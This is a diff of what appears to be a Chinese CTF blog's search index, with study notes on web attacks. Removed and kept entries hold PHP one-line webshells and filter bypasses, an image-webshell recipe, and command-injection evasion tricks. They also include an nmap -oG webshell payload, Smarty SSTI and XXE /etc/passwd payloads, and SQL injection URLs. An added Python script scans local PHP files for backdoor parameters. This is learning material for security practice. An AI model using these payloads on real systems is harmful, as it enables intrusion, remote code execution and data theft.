@@ -252,9 +252,9 @@
       
       <categories>
           
-          <category> 红队 </category>
+          <category> 网络安全 </category>
           
-          <category> 提权 </category>
+          <category> Linux提权 </category>
           
       </categories>
       
@@ -279,9 +279,9 @@
       
       <categories>
           
-          <category> 红队 </category>
+          <category> 网络安全 </category>
           
-          <category> 提权 </category>
+          <category> Linux提权 </category>
           
       </categories>
       
@@ -389,7 +389,7 @@
           
           <category> CTF </category>
           
-          <category> 反序列化 </category>
+          <category> 常见漏洞和手法 </category>
           
       </categories>
       
@@ -416,7 +416,7 @@
           
           <category> CTF </category>
           
-          <category> 常见函数 </category>
+          <category> 常见漏洞和手法 </category>
           
       </categories>
       
@@ -524,7 +524,7 @@
           
           <category> CTF </category>
           
-          <category> 绕过 </category>
+          <category> 常见漏洞和手法 </category>
           
       </categories>
       
@@ -578,7 +578,7 @@
           
           <category> CTF </category>
           
-          <category> 模板注入 </category>
+          <category> 常见漏洞和手法 </category>
           
       </categories>
       
@@ -605,7 +605,7 @@
           
           <category> CTF </category>
           
-          <category> ssi </category>
+          <category> 常见漏洞和手法 </category>
           
       </categories>
       
@@ -615,6 +615,27 @@
             <tag> ssi </tag>
             
         </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>从网站源码中寻找后门脚本</title>
+      <link href="/2021/10/13/%E4%BB%8E%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81%E4%B8%AD%E5%AF%BB%E6%89%BE%E5%90%8E%E9%97%A8%E8%84%9A%E6%9C%AC/"/>
+      <url>/2021/10/13/%E4%BB%8E%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81%E4%B8%AD%E5%AF%BB%E6%89%BE%E5%90%8E%E9%97%A8%E8%84%9A%E6%9C%AC/</url>
+      
+        <content type="html"><![CDATA[<pre><code class="php">import osimport requestsimport reimport threadingimport timeprint(&#39;开始时间：  &#39;+  time.asctime( time.localtime(time.time()) ))s1=threading.Semaphore(100)                                            #这儿设置最大的线程数filePath = r&quot;D:/soft/phpstudy/PHPTutorial/WWW/src/&quot;os.chdir(filePath)                                                    #改变当前的路径requests.adapters.DEFAULT_RETRIES = 5                                #设置重连次数，防止线程数过高，断开连接files = os.listdir(filePath)session = requests.Session()session.keep_alive = False                                             # 设置连接活跃状态为Falsedef get_content(file):    s1.acquire()                                                    print(&#39;trying   &#39;+file+ &#39;     &#39;+ time.asctime( time.localtime(time.time()) ))    with open(file,encoding=&#39;utf-8&#39;) as f:                            #打开php文件，提取所有的$_GET和$_POST的参数            gets = list(re.findall(&#39;\$_GET\[\&#39;(.*?)\&#39;\]&#39;, f.read()))            posts = list(re.findall(&#39;\$_POST\[\&#39;(.*?)\&#39;\]&#39;, f.read()))    data = &#123;&#125;                                                        #所有的$_POST    params = &#123;&#125;                                                        #所有的$_GET    for m in gets:        params[m] = &quot;echo &#39;xxxxxx&#39;;&quot;    for n in posts:        data[n] = &quot;echo &#39;xxxxxx&#39;;&quot;    url = &#39;http://127.0.0.1/src/&#39;+file    req = session.post(url, data=data, params=params)            #一次性请求所有的GET和POST    req.close()                                                # 关闭请求  释放内存    req.encoding = &#39;utf-8&#39;    content = req.text    #print(content)    if &quot;xxxxxx&quot; in content:                                    #如果发现有可以利用的参数，继续筛选出具体的参数        flag = 0        for a in gets:            req = session.get(url+&#39;?%s=&#39;%a+&quot;echo &#39;xxxxxx&#39;;&quot;)            content = req.text            req.close()                                                # 关闭请求  释放内存            if &quot;xxxxxx&quot; in content:                flag = 1                break        if flag != 1:            for b in posts:                req = session.post(url, data=&#123;b:&quot;echo &#39;xxxxxx&#39;;&quot;&#125;)                content = req.text                req.close()                                                # 关闭请求  释放内存                if &quot;xxxxxx&quot; in content:                    break        if flag == 1:                                                    #flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，            param = a        else:            param = b        print(&#39;找到了利用文件： &#39;+file+&quot;  and 找到了利用的参数：%s&quot; %param)        print(&#39;结束时间：  &#39; + time.asctime(time.localtime(time.time())))    s1.release()for i in files:                                                            #加入多线程   t = threading.Thread(target=get_content, args=(i,))   t.start()</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+          <category> 脚本 </category>
+          
+      </categories>
+      
       
     </entry>
     
@@ -702,99 +723,18 @@
     
     
     <entry>
-      <title>一句话木马执行</title>
-      <link href="/2021/10/08/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"/>
-      <url>/2021/10/08/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</url>
-      
-        <content type="html"><![CDATA[<p>正常：<br><?php@eval($_POST['x']);?></p><p>如果有&lt;?过滤，采用：</p><script language="php">eval($_REQUEST[x])</script><p>一种简单的绕安全狗方法：变量传递<br>&lt;?php<br>$a=$_GET[‘x’];<br>$$a=$_GET[‘y’];<br>$b($_POST[‘z’]);</p><p>传入方法：http://       php?x=b&amp;y=assert<br>post:           z=phpinfo();</p><p>问：为什么这里不用eval<br>因为eval赋值给b没有效果的。</p><p>对传入数据进行加密<br><?php assert(base64_decode($_POST['x']));?><br>当这种情况用蚁剑连接时，需要采用base64加密。</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> CTF </category>
-          
-          <category> 文件上传 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> 文件上传 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>简单图片马的制作</title>
-      <link href="/2021/10/08/%E5%9B%BE%E7%89%87%E9%A9%AC%E5%88%B6%E4%BD%9C/"/>
-      <url>/2021/10/08/%E5%9B%BE%E7%89%87%E9%A9%AC%E5%88%B6%E4%BD%9C/</url>
-      
-        <content type="html"><![CDATA[<p>1.首先图片命名111.jpg</p><p>2.再新建222.asp文件，一句话木马写入</p><p>3.然后win+R，cmd，cd到之前图片的目录路径下，命令为copy 111.jpg/b+222.asp/a 333.jpg</p><p>最后就会出现新的图片3333.jpg，就是制作出的图片马。</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> CTF </category>
-          
-          <category> 文件上传 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> 文件上传 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>文件上传之后缀替换</title>
-      <link href="/2021/10/08/%E5%90%8E%E7%BC%80%E6%9B%BF%E6%8D%A2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
-      <url>/2021/10/08/%E5%90%8E%E7%BC%80%E6%9B%BF%E6%8D%A2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
-      
-        <content type="html"><![CDATA[<p>php2，php3、php4、php5，pht，phtml，phps</p><p>.JPEG;.JPE;.JPG，”JPGGraphic File”<br>.gif，”GIF89A”<br> .zip，”Zip Compressed”<br>.doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> CTF </category>
-          
-          <category> 文件上传 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> 文件上传 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>命令执行</title>
       <link href="/2021/10/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
       <url>/2021/10/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
       
-        <content type="html"><![CDATA[<p>php调用外部程序常用的函数：<br>system()—执行shell命令也就是向dos发送一条指令。<br>shell_exec() — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。<br>exec() —执行外部程序。<br>passthru() — 执行外部程序并且显示原始输出。</p><p>绕过技巧：<br>一、常见管道符：<br>‘|’ 直接执行后面的语句<br>‘||’ 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>‘&amp;’ 前面和后面命令都要执行，无论前面真假<br>&amp;&amp;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令<br>Linux:<br>Linux系统包含了windows系统上面四个之外，还多了一个 ‘;’ 这个作用和 ‘&amp;’ 作用相同<br>二、空格绕过(空格被过滤)：<br>&lt;  –  重定向，如cat&lt;flag.php<br>&lt;&gt;      –   重定向，如cat&lt;&gt;flag.php<br>%09  –  需要php环境，如cat%09flag.php<br>${IFS}  –  单纯cat$IFS2,IFS2被bash解释器当做变量名，输不出来结果，加一个{}就固定了变量名，如cat${IFS2}flag.php<br>$IFS$9  –  后面加个$与{}类似，起截断作用，$9是当前系统shell进程第九个参数持有者，始终为空字符串，如cat$IFS2$9flag.php<br>三、黑名单绕过<br>1、拼接<br>a=c;b=at;c=flag;$a$b $c<br>a=c;b=at;c=heb;d=ic;ab{c}{d}<br>2、base64编码<br>echo MTIzCg==|base64 -d 其将会打印123<br>echo “Y2F0IC9mbGFn”|base64-d|bash ==&gt;cat /flag<br>3、hex编码<br>echo “636174202f666c6167” | xxd -r -p|bash ==&gt;cat /flag<br>4、单引号和双引号绕过<br>ca’’t flag 或ca””t flag<br>ca’’t te””st.php<br>5、反斜杠绕过<br>ca\t fl\ag<br>cat te\st.php<br>6、绕过ip中的句点<br>网络地址可以转换成数字地址，比如127.0.0.1可以转化为2130706433。<br>可以直接访问<a href="http://2130706433或者http//0x7F000001%EF%BC%8C%E8%BF%99%E6%A0%B7%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87.%E7%9A%84ip%E8%BF%87%E6%BB%A4%E3%80%82">http://2130706433或者http://0x7F000001，这样就可以绕过.的ip过滤。</a><br>在线转换地址：数字转IP地址 IP地址转数字 域名转数字IP<br>四、绕过长度限制<br>1，通过&gt;来创建文件</p><blockquote><p>flag.txt<br>2，通过&gt;将命令结果存入文件中<br>echo “hello hacker” &gt; flag.txt<br>3，&gt;&gt;符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容<br>echo “hello hacker” &gt;&gt; flag.txt<br>4、Linux中命令换行<br>在Linux中，当我们执行文件中的命令的时候，我们通过在没有写完的命令后面加\，可以将一条命令写在多行。<br>比如：cat flag<br>ca<br>t<br> fla<br>g.txt<br>将命令一条一条输入一个文本中再执行:<br>root@kali:<del># echo “ca\“&gt;cmd<br>root@kali:</del># echo “t\“&gt;&gt;cmd<br>root@kali:<del># echo “ fl\“&gt;&gt;cmd<br>root@kali:</del># echo “ag”&gt;&gt;cmd<br>root@kali:<del># cat cmd<br>ca<br>t<br> fl<br>ag<br>root@kali:</del># sh cmd<br>this is your flag<br>5、ls命令：<br>ls -a 列出文件下所有的文件，包括以“.“开头的隐藏文件（linux下文件隐藏文件是以.开头的，如果存在..代表存在着父目录）。<br>ls -l 列出文件的详细信息，如创建者，创建时间，文件的读写权限列表等等。<br>ls -F 在每一个文件的末尾加上一个字符说明该文件的类型。”@”表示符号链接、”|”表示FIFOS、”/“表示目录、”=”表示套接字。<br>ls -s 在每个文件的后面打印出文件的大小。 size(大小)<br>ls -t 按时间进行文件的排序 Time(时间)<br>ls -A 列出除了”.”和”..”以外的文件。<br>ls -R 将目录下所有的子目录的文件都列出来，相当于我们编程中的“递归”实现<br>ls -L 列出文件的链接名。Link（链接）<br>ls -S 以文件的大小进行排序<br>6、各种读文件命令：<br>cat–由第一行开始显示内容，并将所有内容输出<br>tac–从最后一行倒序显示内容，并将所有内容输出<br>more– 根据窗口大小，一页一页的现实文件内容<br>less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符<br>head– 只显示头几行<br>tail –只显示最后几行<br>nl –类似于cat -n，显示时输出行号<br>tailf– 类似于tail -f<br>vim –使用vim工具打开文本<br>vi –使用vi打开文本cat 由第一行开始显示内容，并将所有内容输出</p></blockquote>]]></content>
+        <content type="html"><![CDATA[<p>php调用外部程序常用的函数：<br>system()—执行shell命令也就是向dos发送一条指令。<br>shell_exec() — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。<br>exec() —执行外部程序。<br>passthru() — 执行外部程序并且显示原始输出。</p><p>绕过技巧：</p><h1 id="常见管道符"><a href="#常见管道符" class="headerlink" title="常见管道符"></a>常见管道符</h1><pre><code class="php">‘|’ 直接执行后面的语句‘||’ 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句‘&amp;’ 前面和后面命令都要执行，无论前面真假&amp;&amp;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令Linux:Linux系统包含了windows系统上面四个之外，还多了一个 ‘;’ 这个作用和 ‘&amp;’ 作用相同</code></pre><h1 id="空格绕过-空格被过滤"><a href="#空格绕过-空格被过滤" class="headerlink" title="空格绕过(空格被过滤"></a>空格绕过(空格被过滤</h1><pre><code class="php">&lt;  --  重定向，如cat&lt;flag.php&lt;&gt;      --   重定向，如cat&lt;&gt;flag.php%09  --  需要php环境，如cat%09flag.php$&#123;IFS&#125;  --  单纯cat$IFS2,IFS2被bash解释器当做变量名，输不出来结果，加一个&#123;&#125;就固定了变量名，如cat$&#123;IFS2&#125;flag.php$IFS$9  --  后面加个$与&#123;&#125;类似，起截断作用，$9是当前系统shell进程第九个参数持有者，始终为空字符串，如cat$IFS2$9flag.php</code></pre><h1 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h1><h2 id="拼接"><a href="#拼接" class="headerlink" title="拼接"></a>拼接</h2><pre><code class="php">a=c;b=at;c=flag;$a$b $ca=c;b=at;c=heb;d=ic;ab&#123;c&#125;&#123;d&#125;</code></pre><h2 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h2><pre><code class="php">echo MTIzCg==|base64 -d 其将会打印123echo &quot;Y2F0IC9mbGFn&quot;|base64-d|bash ==&gt;cat /flag</code></pre><h2 id="hex编码"><a href="#hex编码" class="headerlink" title="hex编码"></a>hex编码</h2><pre><code class="php">echo &quot;636174202f666c6167&quot; | xxd -r -p|bash ==&gt;cat /flag</code></pre><h2 id="单引号和双引号绕过"><a href="#单引号和双引号绕过" class="headerlink" title="单引号和双引号绕过"></a>单引号和双引号绕过</h2><pre><code class="php">ca&#39;&#39;t flag 或ca&quot;&quot;t flagca&#39;&#39;t te&quot;&quot;st.php</code></pre><h2 id="反斜杠绕过"><a href="#反斜杠绕过" class="headerlink" title="反斜杠绕过"></a>反斜杠绕过</h2><pre><code class="php">ca\t fl\agcat te\st.php</code></pre><h2 id="绕过ip中的句点"><a href="#绕过ip中的句点" class="headerlink" title="绕过ip中的句点"></a>绕过ip中的句点</h2><pre><code class="php">网络地址可以转换成数字地址，比如127.0.0.1可以转化为2130706433。可以直接访问http://2130706433或者http://0x7F000001，这样就可以绕过.的ip过滤。在线转换地址：数字转IP地址 IP地址转数字 域名转数字IP</code></pre><h1 id="绕过长度限制"><a href="#绕过长度限制" class="headerlink" title="绕过长度限制"></a>绕过长度限制</h1><h2 id="通过-gt-来创建文件"><a href="#通过-gt-来创建文件" class="headerlink" title="通过&gt;来创建文件"></a>通过&gt;来创建文件</h2><pre><code class="php">&gt;flag.txt</code></pre><h2 id="通过-gt-将命令结果存入文件中"><a href="#通过-gt-将命令结果存入文件中" class="headerlink" title="通过&gt;将命令结果存入文件中"></a>通过&gt;将命令结果存入文件中</h2><pre><code class="php">echo &quot;hello hacker&quot; &gt; flag.txt</code></pre><h2 id="gt-gt-符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容"><a href="#gt-gt-符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容" class="headerlink" title="&gt;&gt;符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容"></a>&gt;&gt;符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容</h2><pre><code class="php">echo &quot;hello hacker&quot; &gt;&gt; flag.txt</code></pre><h2 id="Linux中命令换行"><a href="#Linux中命令换行" class="headerlink" title="Linux中命令换行"></a>Linux中命令换行</h2><p>在Linux中，当我们执行文件中的命令的时候，我们通过在没有写完的命令后面加\，可以将一条命令写在多行。<br>比如：cat flag</p><pre><code class="php">ca\t\ fla\g.txt将命令一条一条输入一个文本中再执行:root@kali:~# echo &quot;ca\\&quot;&gt;cmdroot@kali:~# echo &quot;t\\&quot;&gt;&gt;cmdroot@kali:~# echo &quot; fl\\&quot;&gt;&gt;cmdroot@kali:~# echo &quot;ag&quot;&gt;&gt;cmdroot@kali:~# cat cmdca\t\ fl\agroot@kali:~# sh cmdthis is your flag</code></pre><h2 id="ls命令"><a href="#ls命令" class="headerlink" title="ls命令"></a>ls命令</h2><pre><code class="php">ls -a 列出文件下所有的文件，包括以“.“开头的隐藏文件（linux下文件隐藏文件是以.开头的，如果存在..代表存在着父目录）。ls -l 列出文件的详细信息，如创建者，创建时间，文件的读写权限列表等等。ls -F 在每一个文件的末尾加上一个字符说明该文件的类型。&quot;@&quot;表示符号链接、&quot;|&quot;表示FIFOS、&quot;/&quot;表示目录、&quot;=&quot;表示套接字。ls -s 在每个文件的后面打印出文件的大小。 size(大小)ls -t 按时间进行文件的排序 Time(时间)ls -A 列出除了&quot;.&quot;和&quot;..&quot;以外的文件。ls -R 将目录下所有的子目录的文件都列出来，相当于我们编程中的“递归”实现ls -L 列出文件的链接名。Link（链接）ls -S 以文件的大小进行排序</code></pre><h1 id="各种读文件命令"><a href="#各种读文件命令" class="headerlink" title="各种读文件命令"></a>各种读文件命令</h1><pre><code class="php">cat--由第一行开始显示内容，并将所有内容输出tac--从最后一行倒序显示内容，并将所有内容输出more-- 根据窗口大小，一页一页的现实文件内容less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符head-- 只显示头几行tail --只显示最后几行nl --类似于cat -n，显示时输出行号tailf-- 类似于tail -fvim --使用vim工具打开文本vi --使用vi打开文本cat 由第一行开始显示内容，并将所有内容输出</code></pre>]]></content>
       
       
       <categories>
           
           <category> CTF </category>
           
-          <category> 代码\命令执行类 </category>
+          <category> 常见漏洞和手法 </category>
           
       </categories>
       
@@ -811,8 +751,8 @@
     
     <entry>
       <title>escapeshellarg+escapeshellcmd 函数漏洞</title>
-      <link href="/2021/10/08/%E5%B8%B8%E8%A7%81%E7%9A%84%E5%87%BD%E6%95%B0/"/>
-      <url>/2021/10/08/%E5%B8%B8%E8%A7%81%E7%9A%84%E5%87%BD%E6%95%B0/</url>
+      <link href="/2021/10/08/escapeshellarg+escapeshellcmd%20%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/"/>
+      <url>/2021/10/08/escapeshellarg+escapeshellcmd%20%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/</url>
       
         <content type="html"><![CDATA[<p> escapeshellarg(string $arg): string<br>escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符 。<br>escapeshellcmd<br> escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。</p><p>反斜线（\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]{}$, \x0A 和 \xFF。 ‘ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。 </p><p>这两个函数在一起用会有些问题.PS:先用escapeshellarg再用escapeshellcmd才会有这个问题<br>传入的参数是：172.17.0.2’ -v -d a=1<br>经过escapeshellarg处理后变成了’172.17.0.2’&#39;‘ -v -d a=1’，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。<br>经过escapeshellcmd处理后变成’172.17.0.2’\‘’ -v -d a=1&#39;，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：<a href="http://php.net/manual/zh/function.escapeshellcmd.php">http://php.net/manual/zh/function.escapeshellcmd.php</a><br>最后执行的命令是curl ‘172.17.0.2’\‘’ -v -d a=1&#39;，由于中间的\被解释为\而不再是转义字符，所以后面的’没有被转义，与再后面的’配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1’，即向172.17.0.2\发起请求，POST 数据为a=1’。</p><p>两次转译后出现了问题，没有考虑到单引号的问题</p><p>nmap命令中 有一个参数-oG可以实现将命令和结果写到文件<br>?host=’ <?php @eval($_POST["hack"]);?> -oG hack.php ‘</p><p>总结当两个函数按这样顺序一起使用，使用过滤就没有意义了</p>]]></content>
       
@@ -821,7 +761,7 @@
           
           <category> CTF </category>
           
-          <category> 常见函数 </category>
+          <category> 常见漏洞和手法 </category>
           
       </categories>
       
@@ -829,62 +769,6 @@
         <tags>
             
             <tag> 函数 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>ssti</title>
-      <link href="/2021/10/08/ssti/"/>
-      <url>/2021/10/08/ssti/</url>
-      
-        <content type="html"><![CDATA[<p>&#123;&#123; worldcount&#40;post.content&#41; &#125;&#125;</p><p>Flask使用Jinja2作为模板引擎<br>语法：<br>&#123;%…%&#125;语句(statements)<br>&#123;&#123;…&#125;&#125;打印模板输出的表达式(Expressions)<br>&#123;#…#&#125;注释<br>#…##行语句(Line Statements)</p><p>smarty注入payload</p><p>&#123;if phpinfo()&#125;&#123;/if&#125;<br>&#123;if system(‘ls’)&#125;&#123;/if&#125;<br>&#123; readfile(‘/flag’) &#125;<br>&#123;if show_source(‘/flag’)&#125;&#123;/if&#125;<br>&#123;if system(‘cat ../../../flag’)&#125;&#123;/if&#125; #本题payload</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> CTF </category>
-          
-          <category> 模板注入 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> ssti </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>python的一些内置函数</title>
-      <link href="/2021/10/08/python%E7%9A%84%E4%B8%80%E4%BA%9B%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0/"/>
-      <url>/2021/10/08/python%E7%9A%84%E4%B8%80%E4%BA%9B%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0/</url>
-      
-        <content type="html"><![CDATA[<p>不过python还有一些内置函数，比如url_for和get_flashed_messages<br>/shrine/<br>    url_for(‘static’, filename=’style.css’)<br>    这个文件应该存储在文件系统上的 static/style.css 。<br>/shrine/  注意：globals两边是两个_<br>get_flashed<br>flask闪现：<br>Flask 提供了一个非常简单的方法来使用闪现系统向用户反馈信息。闪现系统使得在一个请求结束的时候记录一个信息，然后在且仅仅在下一个请求中访问这个数据，强调flask闪现是基于flask内置的session的，利用浏览器的session缓存闪现信息。所以必须设置secret_key。</p><p><a href="http://2785d0f9-c4bd-42b4-941c-82f794e4209b.node4.buuoj.cn:81/shrine/%7B%7Burl_for.__globals__%7D%7D">http://2785d0f9-c4bd-42b4-941c-82f794e4209b.node4.buuoj.cn:81/shrine/%7B%7Burl_for.__globals__%7D%7D</a></p><p><a href="http://2785d0f9-c4bd-42b4-941c-82f794e4209b.node4.buuoj.cn:81/shrine/%7B">http://2785d0f9-c4bd-42b4-941c-82f794e4209b.node4.buuoj.cn:81/shrine/%7B</a><br>%7Burl_for.<strong>globals</strong>%7D%7D</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> CTF </category>
-          
-          <category> 常见函数 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> 函数 </tag>
-            
-            <tag> python </tag>
             
         </tags>
       
@@ -904,7 +788,7 @@
           
           <category> CTF </category>
           
-          <category> 代码\命令执行类 </category>
+          <category> 常见漏洞和手法 </category>
           
       </categories>
       
@@ -958,7 +842,7 @@
           
           <category> CTF </category>
           
-          <category> 绕过 </category>
+          <category> 常见漏洞和手法 </category>
           
       </categories>
       
@@ -985,7 +869,7 @@
           
           <category> CTF </category>
           
-          <category> 代码\命令执行类 </category>
+          <category> 常见漏洞和手法 </category>
           
       </categories>
       
@@ -1005,14 +889,14 @@
       <link href="/2021/10/08/xml%E6%BC%8F%E6%B4%9E/"/>
       <url>/2021/10/08/xml%E6%BC%8F%E6%B4%9E/</url>
       
-        <content type="html"><![CDATA[<p>XXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p><ul><li><p>XML被设计为传输和存储数据，其焦点是数据的内容。</p></li><li><p>HTML被设计用来显示数据，其焦点是数据的外观。</p></li><li><p>所有 XML 元素都须有关闭标签。</p></li><li><p>XML 标签对大小写敏感。</p></li><li><p>XML 必须正确地嵌套。</p></li><li><p>XML 文档必须有根元素。</p></li><li><p>XML 的属性值须加引号</p></li><li><p>所有 XML 元素都须有关闭标签。</p></li><li><p>XML 标签对大小写敏感。</p></li><li><p>XML 必须正确地嵌套。</p></li><li><p>XML 文档必须有根元素。</p></li><li><p>XML 的属性值须加引号。<br><code>&lt;message&gt;hello &lt; world&lt;/message&gt;</code>,为了避免错误。我们用实体引用<code>&amp;lt;</code>来代替”&lt;”字符。XML中，有5个预定义的实体引用。<br>&amp;lt &lt;<br>&amp;gt &gt;<br>&amp;amp &amp;<br>&amp;apos ‘<br>&amp;quot ‘<br>语法：<!-- --></p></li></ul><p>内部声明：<br>1</p><!DOCTYPE 根元素 [元素声明]><p>外部声明：<br>1</p><!DOCTYPE 根元素 SYSTEM "文件名"><p>XXE漏洞就是XML外部实体注入。当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p><p>xml实体：<br><?xml version="1.0" encoding="utf-8"?><br><!DOCTYPE note [  <!ENTITY admin SYSTEM "file:///etc/passwd"><br>  ]&gt;<br><user><username>&admin;</username><password>123456</password></user></p>]]></content>
+        <content type="html"><![CDATA[<p>XXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p><ul><li><p>XML被设计为传输和存储数据，其焦点是数据的内容。</p></li><li><p>HTML被设计用来显示数据，其焦点是数据的外观。</p></li><li><p>所有 XML 元素都须有关闭标签。</p></li><li><p>XML 标签对大小写敏感。</p></li><li><p>XML 必须正确地嵌套。</p></li><li><p>XML 文档必须有根元素。</p></li><li><p>XML 的属性值须加引号</p></li><li><p>所有 XML 元素都须有关闭标签。</p></li><li><p>XML 标签对大小写敏感。</p></li><li><p>XML 必须正确地嵌套。</p></li><li><p>XML 文档必须有根元素。</p></li><li><p>XML 的属性值须加引号。<br><code>&lt;message&gt;hello &lt; world&lt;/message&gt;</code>,为了避免错误。我们用实体引用<code>&amp;lt;</code>来代替”&lt;”字符。XML中，有5个预定义的实体引用。<br>&amp;lt &lt;<br>&amp;gt &gt;<br>&amp;amp &amp;<br>&amp;apos ‘<br>&amp;quot ‘<br>语法：<!-- --></p></li></ul><p>内部声明：</p><p><img src="/2021/10/08/xml%E6%BC%8F%E6%B4%9E/image-20220311140522532.png" alt="image-20220311140522532"></p><p>外部声明：</p><p>​    <img src="/2021/10/08/xml%E6%BC%8F%E6%B4%9E/image-20220311140536481.png" alt="image-20220311140536481"></p><p>xml实体：<br><?xml version="1.0" encoding="utf-8"?></p><p><img src="/2021/10/08/xml%E6%BC%8F%E6%B4%9E/image-20220311140547883.png" alt="image-20220311140547883"></p>]]></content>
       
       
       <categories>
           
           <category> CTF </category>
           
-          <category> xml </category>
+          <category> 常见漏洞和手法 </category>
           
       </categories>
       
@@ -1020,141 +904,6 @@
         <tags>
             
             <tag> xml </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>sql常用注入手法</title>
-      <link href="/2021/10/08/sql/"/>
-      <url>/2021/10/08/sql/</url>
-      
-        <content type="html"><![CDATA[<p>MySQL 中的 RIGHT(s，n) 函数返回字符串 s 最右边的 n 个字符。可配合extractvalue进行完全显示<br>sql报错盲注：<br>union系列：<br>爆出数据库：<br>127.0.0.1/sqli-labs/Less-5/?id=1’ union Select 1,count(*),concat(0x3a,0x3a,(select group_concat(schema_name) from information_schema.schemata ),0x3a,0x3a,floor(rand(0)*2))a from information_schema.schemata group by a  – +</p><p>如果想一个一个显示，那么把group_concat去掉，再加上limit 0,1<br>127.0.0.1/sqli-labs/Less-5/?id=1’ union Select 1,count(*),concat(0x3a,0x3a,(select schema_name from information_schema.schemata limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.schemata group by a  – +</p><p>爆出表:<br><a href="http://127.0.0.1/sqli-labs/Less-5/?id=1&#39;">http://127.0.0.1/sqli-labs/Less-5/?id=1&#39;</a> union Select 1,count(*),concat(0x3a,0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=’security’  ),0x3a,0x3a,floor(rand(0)*2))a from information_schema.schemata group by a  – +</p><p>updatexml:<br>payload:-1’and updatexml(1,concat(0x7e,database(),0x7e),1)%23 其中updatexml(1,concat(0x7e, ,0x7e),1),是基本格式，0x7e是十六进制的“~”，用来让查询到的东西更显眼。我们只需要在两个0x7e中间加入要查询的语句就可以了。<br>爆出当前数据库：<br><a href="http://127.0.0.1/sqli-labs/Less-5/?id=-1&#39;and">http://127.0.0.1/sqli-labs/Less-5/?id=-1&#39;and</a> updatexml(1,concat(0x7e,database(),0x7e),1)–+<br>updatexml（）这个函数最多只能爆32位字符，而我们要爆的数据超过了这个位数，所以我们一个一个的查，使用limit 